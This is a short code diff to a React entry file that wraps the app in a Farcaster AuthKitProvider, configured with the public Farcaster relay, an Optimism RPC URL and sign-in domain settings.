-createRoot(document.getElementById('root')).render(<App />);
+// ─── Auth Kit Config ───
+const authKitConfig = {
+  relay: 'https://relay.farcaster.xyz',
+  rpcUrl: 'https://mainnet.optimism.io',
+  domain: typeof window !== 'undefined' ? window.location.host : 'devin-pi.vercel.app',
+  siweUri: typeof window !== 'undefined' ? window.location.origin : APP_URL,
+};
+
+function Root() {
+  return (
+    <AuthKitProvider config={authKitConfig}>
+      <App />
+    </AuthKitProvider>
+  );
+}
+
+createRoot(document.getElementById('root')).render(<Root />);
